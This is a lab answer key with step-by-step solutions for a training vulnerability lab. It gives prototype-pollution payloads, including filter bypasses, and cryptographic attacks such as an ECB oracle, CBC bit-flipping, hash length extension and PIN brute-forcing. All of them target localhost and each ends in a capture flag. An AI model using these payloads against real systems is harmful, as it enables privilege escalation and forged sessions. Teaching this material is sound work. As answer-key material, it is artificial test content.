# PenTrix VulnLab – Batch 10 Solutions (Prototype Pollution + Cryptographic Failures)

Every walkthrough below was executed against a live lab boot and the flag
captured from the server response. Pollution in the proto module is
process-wide: if a check passes "for free", restart the server for a clean
slate before the next lab.

## proto – Prototype Pollution

**1. Query-String Pollution** – `PENTRIX{proto_proto-query}`
1. Merge the payload (brackets URL-encoded for curl):
   `curl -c jar -b jar "http://localhost:3000/proto/query?__proto__%5Brole%5D=admin"`
2. Open the admin check in the same session:
   `curl -c jar -b jar "http://localhost:3000/proto/query/admin"`
   The page prints `PENTRIX{proto_proto-query}`.
Why it works: the nested query parser keeps `__proto__` as a real key and the naive `merge()` walks it straight onto `Object.prototype`, so a brand-new `{}` inherits `role = 'admin'`.

**2. JSON Body Pollution** – `PENTRIX{proto_proto-json}`
1. POST a JSON body with a literal `__proto__` key:
   `curl -c jar -b jar -X POST http://localhost:3000/proto/json/merge -H 'Content-Type: application/json' -d '{"__proto__": {"role": "admin"}}'`
2. `curl -c jar -b jar http://localhost:3000/proto/json/admin` prints `PENTRIX{proto_proto-json}`.
Why it works: `JSON.parse` creates an own property literally named `__proto__`, and the merge copies it onto `Object.prototype` with no key filtering.

**3. Blacklist Bypass via constructor** – `PENTRIX{proto_proto-constructor}`
1. The merge drops any key containing the literal string `__proto__`. Take the other entrance to the prototype chain:
   `curl -c jar -b jar "http://localhost:3000/proto/constructor?constructor%5Bprototype%5D%5Brole%5D=admin"`
2. `curl -c jar -b jar http://localhost:3000/proto/constructor/admin` prints `PENTRIX{proto_proto-constructor}`.
Why it works: `constructor.prototype` reaches the very same `Object.prototype`, and the blacklist only blocks the literal `__proto__` spelling, so the merge pollutes through the back door.

**4. Polluting toString** – `PENTRIX{proto_proto-dos}`
1. `curl "http://localhost:3000/proto/dos?__proto__%5BtoString%5D=boom"`
2. The response is the crash page ("The widget broke") containing `PENTRIX{proto_proto-dos}`.
Why it works: `__proto__[toString]=boom` merges the string `"boom"` into the widget's per-request prototype scope, so the page's `` `${widget}` `` coercion calls a non-function `toString` and throws; the crash handler awards the flag.

**5. Client-Side Pollution** – `PENTRIX{proto_proto-client}`
1. Open `http://localhost:3000/proto/client?__proto__[theme]=dark` in a real browser.
2. The page's in-browser parser + naive merge pollutes `Object.prototype` in that page, the theme box renders `dark` (read from a fresh `{}`), and the page auto-reports to `/proto/client/claim?theme=dark`, which prints `PENTRIX{proto_proto-client}`.
Why it works: the vulnerable merge runs in the victim's browser, so a `__proto__[theme]` query parameter changes what every fresh object in the page reads; the page itself reports the demonstrated value to the claim endpoint.
(Verified by executing the page's exact script with a simulated DOM: a fresh `{}` read `theme = 'dark'` and the script built the claim redirect.)

**6. Unicode Escape Bypass** – `PENTRIX{proto_proto-unicode-bypass}`
1. The merge endpoint rejects raw bodies containing the literal string `__proto__` (400). Smuggle it as JSON escapes, sent as `text/plain` so the server sees your exact bytes:
   `curl -c jar -b jar -X POST http://localhost:3000/proto/unicode/merge -H 'Content-Type: text/plain' --data-binary '{"\u005f\u005fproto\u005f\u005f": {"role": "admin"}}'`
   The response says "Blacklist passed".
2. `curl -c jar -b jar http://localhost:3000/proto/unicode/admin` prints `PENTRIX{proto_proto-unicode-bypass}`.
Why it works: the blacklist scans the raw text, but `JSON.parse` decodes `\u005f` escapes after the scan, so the forbidden `__proto__` key materializes inside the merge.

## crypto – Cryptographic Failures

**1. Predictable Reset PIN** – `PENTRIX{crypto_crypto-rand-pin}`
1. `curl -c jar -b jar -X POST http://localhost:3000/crypto/pin/generate`
2. Brute-force `000000`-`999999` against `POST /crypto/pin/verify` with `pin=<guess>` as a form field. There is no rate limiting. A script with 100 concurrent keep-alive connections found the PIN in about 72 seconds (206,469 guesses, roughly 2,800 requests/second); the winning response contains `PENTRIX{crypto_crypto-rand-pin}`.
Why it works: the PIN comes from `Math.random`, which is not a CSPRNG, and a 6-digit space with no lockout is trivially enumerable by script.

**2. ECB Decryption Oracle** – `PENTRIX{crypto_crypto-ecb-oracle}`
1. Find the block size: `POST /crypto/ecb/encrypt` with `inhex=` set to `41` repeated N times. The hex ciphertext (in `<code id="ct">`) grows from 32 to 48 bytes at a 4-byte prefix, so the block size is 16. (Careful: when prefix + secret exactly fills a block, PKCS#7 appends a full pad block, which also grows the ciphertext.)
2. Confirm ECB: encrypt 48 identical bytes (`41` x 48 as hex); the ciphertext shows three identical 16-byte blocks.
3. Find the secret length: first growth at prefix 4, and a disambiguation probe at prefix 19 still returns 48 bytes (not 64), so the length is 28, not 29.
4. Decrypt byte-at-a-time: for byte `i`, send a prefix of `15 - (i mod 16)` bytes so the unknown byte lands at the end of block `floor(i/16)`. Build a dictionary of that block's ciphertext for all 256 possible last-byte values (`prefix || known || guess`), then look up the block from the prefix-only query. Repeat for all 28 bytes.
5. `POST /crypto/ecb/solve` with `plaintext=<recovered secret>`. The attack recovered `O0R6LQSmrFzKTjqy996nBOUrCxQ=` (28 bytes; the secret is random per boot) and the response contained `PENTRIX{crypto_crypto-ecb-oracle}`.
Why it works: ECB encrypts identical plaintext blocks to identical ciphertext blocks, so attacker-controlled prefix bytes can align each unknown secret byte to a block boundary and identify it by dictionary comparison.

**3. CBC Bit-Flipping** – `PENTRIX{crypto_crypto-cbc-bitflip}`
1. `curl -c jar -b jar -X POST http://localhost:3000/crypto/cbc/login` and copy the base64 cookie from `<code id="ck">`.
2. Decode it: the first 16 bytes are the IV, the rest is `AES-128-CBC(iv, '{"role":"guest","user":"guest"}')`. The string `"guest"` (the role value) sits at plaintext bytes 9-13, directly under the IV.
3. Flip the IV bytes over it: `iv[9+i] ^= 'guest'[i] ^ 'admin'[i]` for `i` in 0..4. Reassemble `base64(new_iv || ciphertext)`.
4. `curl -c jar -b jar -X POST http://localhost:3000/crypto/cbc/check --data-urlencode "cookie=<forged>"`. The server decrypts it, sees `role = 'admin'`, and prints `PENTRIX{crypto_crypto-cbc-bitflip}`.
Why it works: CBC decryption XORs each block with the previous ciphertext block (or IV), so IV bit flips cause predictable plaintext bit flips, and the cookie has no integrity check (no MAC) to reject the tampering.

**4. Hash Length Extension** – `PENTRIX{crypto_crypto-hash-ext}`
1. `GET /crypto/mac/sign?msg=role%3Duser` returns `{"msg": "role=user", "mac": "<sha256 hex>"}`. The page states the secret is 16 bytes, and the signer refuses any message containing `admin`.
2. In pure code (a from-scratch SHA-256 with injectable initial state; no new dependencies), take the returned MAC as the compression state. Build the glue padding for a 25-byte prefix (16 secret + 9 message bytes): `0x80`, zeros, then the 64-bit big-endian bit length.
3. Forged message = `role=user || glue || ;admin=1` (hex-encode it as `msghex`). Forged MAC = continue SHA-256 from the leaked state over `;admin=1 || padding-for-72-bytes`.
4. `POST /crypto/mac/verify` with `msghex=<hex>` and `mac=<forged hex>`. The response contains `PENTRIX{crypto_crypto-hash-ext}`.
Why it works: SHA-256 is Merkle-Damgard, so its digest is the entire internal state; anyone holding one valid MAC can append data and compute a valid MAC for the longer message without ever learning the secret.

**5. Crack the MD5** – `PENTRIX{crypto_crypto-md5-crack}`
1. Read the leaked hash from `/crypto/md5` (it is `0571749e2ac330a7455809c6b0e7af90`, fixed per lab design).
2. Fetch `/crypto/md5/wordlist.txt` and MD5 each of the 48 candidates until one matches: the password is `sunshine`.
3. `curl -c jar -b jar -X POST http://localhost:3000/crypto/md5/login --data-urlencode "username=demo" --data-urlencode "password=sunshine"`. The login succeeds and prints `PENTRIX{crypto_crypto-md5-crack}`.
Why it works: an unsalted, fast MD5 of a dictionary word falls to an offline dictionary attack in milliseconds.

**6. Base64 "Encryption"** – `PENTRIX{crypto_crypto-b64-cookie}`
1. `curl -c jar -b jar -X POST http://localhost:3000/crypto/b64/login` and copy the cookie from `<code id="ck">`.
2. Decode it: `echo '<cookie>' | base64 -d` gives `{"user":"guest","role":"user"}`. Change `"role":"user"` to `"role":"admin"` and re-encode with base64.
3. `curl -c jar -b jar -X POST http://localhost:3000/crypto/b64/check --data-urlencode "cookie=<re-encoded>"`. The response prints `PENTRIX{crypto_crypto-b64-cookie}`.
Why it works: the "encryption" was only base64 encoding, which is trivially reversible, and the server trusts whatever decodes to valid JSON.

**7. XOR Crib Dragging** – `PENTRIX{crypto_crypto-xor-crib}`
1. Copy the ciphertext hex from `<code id="ct">` on `/crypto/xor`.
2. The page tells you every document starts with the 9-byte header `{"user":"`. For each candidate key length 1-12: derive `key[i mod L] = ct[i] XOR crib[i]` over the crib, decrypt the full ciphertext, and keep the length that yields valid JSON. (Length 8 wins; the key and token are random per boot. One run recovered key `aa9bf2fdf48bd86d` and plaintext `{"user":"guest","token":"6a6a86ab2543cd2d"}`.)
3. `POST /crypto/xor/solve` with `plaintext=<recovered JSON>`. The response contains `PENTRIX{crypto_crypto-xor-crib}`.
Why it works: a short repeating XOR key turns known plaintext into known keystream, so the crib exposes the key bytes and the rest of the message decrypts.

**8. Key in JavaScript** – `PENTRIX{crypto_crypto-key-in-js}`
1. `curl http://localhost:3000/crypto/keyjs/app.js` and read the key: `const ENCRYPTION_KEY = 'PenTrixKey2026!!';` (16 bytes, hardcoded in the served bundle).
2. Copy the ciphertext hex from `<code id="ct">` on `/crypto/keyjs`. The first 16 bytes are the IV. Decrypt AES-128-CBC with the stolen key, e.g. in Node:
   `crypto.createDecipheriv('aes-128-cbc', Buffer.from('PenTrixKey2026!!'), iv)`.
   The note decrypts to `Vault combination: 04-17-2026. Do not share.`
3. `POST /crypto/keyjs/solve` with `plaintext=<decrypted note>`. The response contains `PENTRIX{crypto_crypto-key-in-js}`.
Why it works: a key shipped to the browser is public to every visitor, and with the IV prepended to the ciphertext anyone can decrypt the "client-side encrypted" note offline.
